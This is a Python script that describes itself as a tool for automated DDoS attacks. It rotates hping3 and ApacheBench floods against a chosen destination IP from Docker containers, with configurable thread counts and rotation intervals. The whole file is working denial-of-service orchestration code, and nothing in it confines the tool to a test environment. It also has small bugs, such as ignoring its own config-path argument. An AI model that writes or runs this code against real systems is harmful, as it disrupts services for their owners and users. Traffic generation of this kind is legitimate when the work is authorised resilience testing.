import argparse
from datetime import datetime
import docker
from itertools import cycle
import signal
import time
import sys
import yaml

def read_conf(path):
  with open(path) as f:
    return yaml.safe_load(f)

def build_command(attack):
  command = [attack['tool']]
  flags = []
  if 'flags' in attack and type(attack['flags']) == list:
    for flag in attack['flags']:
      flag = flag.split()
      flags += flag
    command += flags
  command.append(args.destination)
  return command

def create_attack_container(attack):
  command = build_command(attack)
  if attack['tool'] == 'hping3':
    container_image = 'utkudarilmaz/hping3'
  elif attack['tool'] == 'ab':
    container_image = 'jordi/ab'
  else:
    print('There in no known dokcer image for %s. Exiting...' % (attack['tool']))
    sys.exit(1)
  if args.network:
    container = client.containers.create(container_image, command, network=args.network)
  else:
    container = client.containers.create(container_image, command)
  return container

def rotate_attacks(attacks):
  attacks_cycle = cycle(attacks)
  for attack in attacks_cycle:
    containers.clear()
    print('%s ATTACK START: %s: %s' % (datetime.now(), attack['type'], build_command(attack)))
    for _ in range(args.threads):
      container = create_attack_container(attack)
      containers.append(container)
      container.start()
    time.sleep(args.interval)
    print('%s ATTACK STOP: %s' % (datetime.now(), attack['type']))
    for container in containers:
      container.remove(force=True)

def signal_handler(sig, frame):
        print('Killing all running containers...')
        for container in containers:
          print(container.name)
          container.remove(force=True)
        sys.exit(0)

if __name__ == "__main__":
  
  CONF_PATH = 'soda.yml'

  parser = argparse.ArgumentParser(description='Tool for automated launch of DDoS attacks')
  parser.add_argument('-c','--conf', help='Path to config file', type=str, default=CONF_PATH)
  parser.add_argument('-i','--interval', help='Attack rotation interval', type=int, default=60)
  parser.add_argument('-n','--network', help='Docker Network to put containers to', type=str)
  parser.add_argument('-p','--pattern', help='Pattern of launching attacks', type=str, default='rotate')
  parser.add_argument('-t','--threads', help='Number of attack generation tool threads', type=int, default=1)
  parser.add_argument('destination', help='Attack destination IP', type=str)

  args, unknown = parser.parse_known_args()

  conf = read_conf(CONF_PATH)

if args.pattern == 'rotate':
  containers = []
  signal.signal(signal.SIGINT, signal_handler)
  client = docker.from_env()
  rotate_attacks(conf['attacks'])
